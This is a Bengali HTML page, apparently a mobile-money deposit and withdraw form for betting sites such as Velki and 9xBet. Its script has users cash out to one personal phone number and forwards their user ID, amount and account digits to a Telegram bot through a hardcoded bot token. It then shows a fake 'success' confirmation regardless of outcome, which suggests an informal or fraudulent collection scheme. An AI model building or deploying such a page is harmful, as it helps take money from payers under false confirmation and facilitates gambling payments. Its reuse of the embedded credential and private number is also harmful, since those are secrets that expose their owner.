<!DOCTYPE html>
<html lang="bn">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">

<style>
*{box-sizing:border-box;}

html,body{
  height:100%;
  overflow:hidden;
}

body{
  margin:0;
  font-family:'Poppins',sans-serif;
  background:linear-gradient(180deg,#020617,#031b34);
  color:white;
  display:flex;
  justify-content:center;
}

.container{
  width:100%;
  max-width:380px;
  padding:15px;
  padding-top:25px;
  padding-bottom:120px;
  height:100vh;
  overflow-y:auto;
}

.top-note{
  overflow:hidden;
  background: rgba(14,165,233,0.15);
  border-radius:12px;
  margin-bottom:8px;
}
.top-note span{
  display:inline-block;
  padding:10px;
  white-space:nowrap;
  animation:slide 10s linear infinite;
}

@keyframes slide{
  0%{transform:translateX(100%);}
  100%{transform:translateX(-100%);}
}

.tabs{
  display:flex;
  margin-bottom:8px;
  background:#020617;
  border-radius:20px;
  padding:4px;
}
.tab{
  flex:1;
  padding:12px;
  text-align:center;
  border-radius:20px;
  cursor:pointer;
  color:#94a3b8;
}
.tab.active{
  background:linear-gradient(45deg,#0ea5e9,#2563eb);
  color:white;
}

.card{
  background:rgba(2,6,23,0.9);
  padding:20px;
  border-radius:22px;
  margin-top:10px;
}

.methods{
  display:flex;
  gap:8px;
  margin-bottom:12px;
}
.method{
  flex:1;
  padding:10px;
  text-align:center;
  background:#0f172a;
  border-radius:14px;
  cursor:pointer;
}
.method.active{border:1px solid #0ea5e9;}

.number-card{
  display:none;
  margin-top:10px;
  margin-bottom:10px;
  padding:15px;
  border-radius:18px;
  background:#020617;
  border:1px dashed #0ea5e9;
  text-align:center;
  font-size:18px;
}
.number-card b{
  font-size:22px;
}

.row{
  display:flex;
  gap:8px;
}
.row input{
  flex:1;
  min-width:0;
  padding:14px;
  border-radius:16px;
  background:linear-gradient(145deg,#0f172a,#020617);
  border:1px solid rgba(14,165,233,0.3);
  color:white;
  outline:none;
}

.btn{
  width:100%;
  padding:14px;
  margin-top:15px;
  background:linear-gradient(45deg,#0ea5e9,#2563eb);
  border:none;
  border-radius:16px;
  color:white;
  font-weight:600;
}

.float-area{
  position: fixed;
  left: 15px;
  bottom: 20px;
  display: flex;
  flex-direction: column;
  gap: 8px;
  z-index: 9999;
}

.site-card{
  width:120px;
  height:55px;
  padding:10px;
  border-radius:14px;
  background:rgba(14,165,233,0.15);
  border:1px solid rgba(14,165,233,0.3);
  text-align:center;
  font-size:12px;
  cursor:pointer;
  display:flex;
  flex-direction:column;
  justify-content:center;
  align-items:center;
}

.site-card b{
  font-size:13px;
}

/* ========================= */
/* 🔥 PREMIUM SUCCESS MODAL */
/* ========================= */

.success-modal{
  position:fixed;
  top:50%;
  left:50%;
  transform:translate(-50%,-50%);
  width:85%;
  max-width:300px;
  background:rgba(2,6,23,0.95);
  border:1px solid #0ea5e9;
  border-radius:20px;
  text-align:center;
  padding:25px;
  display:none;
  z-index:99999;
  box-shadow:0 0 30px rgba(14,165,233,0.4);
}

.checkmark{
  width:70px;
  height:70px;
  border-radius:50%;
  border:3px solid #22c55e;
  margin:0 auto 15px auto;
  position:relative;
  animation:pop 0.4s ease;
}

.checkmark:after{
  content:"";
  position:absolute;
  left:22px;
  top:10px;
  width:20px;
  height:35px;
  border-right:4px solid #22c55e;
  border-bottom:4px solid #22c55e;
  transform:rotate(45deg);
}

@keyframes pop{
  0%{transform:scale(0);}
  100%{transform:scale(1);}
}

.order-id{
  margin-top:10px;
  font-size:14px;
  color:#94a3b8;
}
</style>
</head>

<body>

<div class="container">

<div class="top-note">
  <span>⏳ অনুগ্রহ করে অপেক্ষা করুন, আপনার ডিপোজিট প্রক্রিয়াধীন...</span>
</div>

<div class="tabs">
  <div class="tab active" onclick="showTab('deposit', event)">Deposit</div>
  <div class="tab" onclick="showTab('withdraw', event)">Withdraw</div>
</div>

<div id="deposit" class="card">

  <div class="methods" id="depositMethods">
    <div class="method active" onclick="selectMethod(this,'deposit')">বিকাশ</div>
    <div class="method" onclick="selectMethod(this,'deposit')">নগদ</div>
    <div class="method" onclick="selectMethod(this,'deposit')">রকেট</div>
  </div>

  <div class="number-card" id="numberCard"></div>

  <div class="row">
    <input type="text" id="d_userid" placeholder="ইউজার ID">
    <input type="number" id="d_amount" placeholder="টাকার পরিমাণ">
    <input type="text" id="d_last" placeholder="লাস্ট ৪ ডিজিট">
  </div>

  <button class="btn" onclick="sendDeposit()">সাবমিট</button>
</div>

<div id="withdraw" class="card" style="display:none;">

  <div class="methods" id="withdrawMethods">
    <div class="method active" onclick="selectMethod(this,'withdraw')">বিকাশ</div>
    <div class="method" onclick="selectMethod(this,'withdraw')">নগদ</div>
    <div class="method" onclick="selectMethod(this,'withdraw')">রকেট</div>
  </div>

  <div class="row">
    <input type="text" id="w_userid" placeholder="ইউজার ID">
    <input type="number" id="w_amount" placeholder="টাকার পরিমাণ">
    <input type="text" id="w_number" placeholder="নাম্বার">
  </div>

  <button class="btn" onclick="sendWithdraw()">সাবমিট</button>
</div>

</div>

<!-- FLOAT -->
<div class="float-area">
  <div class="site-card" onclick="window.open('https://velki247.live','_blank')"><b>ভেল্কি</b></div>
  <div class="site-card" onclick="window.open('https://www.bjwala.co','_blank')"><b>বাজিওয়ালা</b></div>
  <div class="site-card" onclick="window.open('https://www.9xbet9.live/','_blank')"><b>9xBet</b></div>
</div>

<!-- ========================= -->
<!-- 🔥 SUCCESS MODAL HTML -->
<!-- ========================= -->
<div class="success-modal" id="successModal">
  <div class="checkmark"></div>
  <h3>সাকসেসফুল!</h3>
  <div>আপনার রিকোয়েস্ট সফল হয়েছে</div>
  <div class="order-id" id="orderId"></div>
</div>

<script>
const botToken = "8216213984:AAFCOQsGouXgnit2vKR6Rv8-VonSYL7_irk";
const chatId = "8406979793";

let orderCounter = 23;
let selectedDeposit = "বিকাশ";
let selectedWithdraw = "বিকাশ";

function generateOrderId(){
  return "#" + (orderCounter++);
}

function showSuccess(id){
  document.getElementById("orderId").innerText = "Order ID: " + id;
  document.getElementById("successModal").style.display = "block";

  setTimeout(()=>{
    document.getElementById("successModal").style.display = "none";
  },3000);
}

function sendDeposit(){
  let id = generateOrderId();

  let msg = `📥 Deposit Request
━━━━━━━━━━━━
🆔 Order ID: ${id}
💳 Method: ${selectedDeposit}
👤 User ID: ${d_userid.value}
💰 Amount: ${d_amount.value}
🔢 Last 4 Digit: ${d_last.value}
📅 ${new Date().toLocaleString()}
━━━━━━━━━━━━`;

  sendToTelegram(msg);

  showSuccess(id);
}

function sendWithdraw(){
  let id = generateOrderId();

  let msg = `📤 Withdraw Request
━━━━━━━━━━━━
🆔 Order ID: ${id}
💳 Method: ${selectedWithdraw}
👤 User ID: ${w_userid.value}
💰 Amount: ${w_amount.value}
📱 Number: ${w_number.value}
📅 ${new Date().toLocaleString()}
━━━━━━━━━━━━`;

  sendToTelegram(msg);

  showSuccess(id);
}

function sendToTelegram(message){
  fetch(`https://api.telegram.org/bot${botToken}/sendMessage`,{
    method:"POST",
    headers:{"Content-Type":"application/json"},
    body:JSON.stringify({chat_id:chatId,text:message})
  });
}

function selectMethod(el,type){
  let parent = type==='deposit'?depositMethods:withdrawMethods;
  parent.querySelectorAll('.method').forEach(m=>m.classList.remove('active'));
  el.classList.add('active');

  if(type==='deposit'){
    selectedDeposit = el.innerText;
    numberCard.innerHTML = `<b>01316616956</b><br>ক্যাশ আউট করুন`;
    numberCard.style.display="block";
  }else{
    selectedWithdraw = el.innerText;
  }
}

function showTab(tab,e){
  deposit.style.display='none';
  withdraw.style.display='none';
  document.getElementById(tab).style.display='block';

  document.querySelectorAll('.tab').forEach(t=>t.classList.remove('active'));
  e.target.classList.add('active');
}
</script>

</body>
</html>
